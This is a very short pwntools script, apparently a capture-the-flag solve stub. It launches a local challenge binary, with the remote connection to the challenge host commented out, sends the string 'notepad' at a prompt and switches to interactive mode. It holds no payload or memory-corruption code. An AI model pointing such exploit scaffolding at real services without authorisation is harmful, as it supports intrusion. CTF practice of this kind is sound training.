from pwn import *
#p=remote("fitsec-futility.chals.io", 443, ssl=True, sni="fitsec-futility.chals.io")
p = process("./frutility.bin")
p.recvuntil(">>>")
p.sendline(b'notepad')
p.interactive()
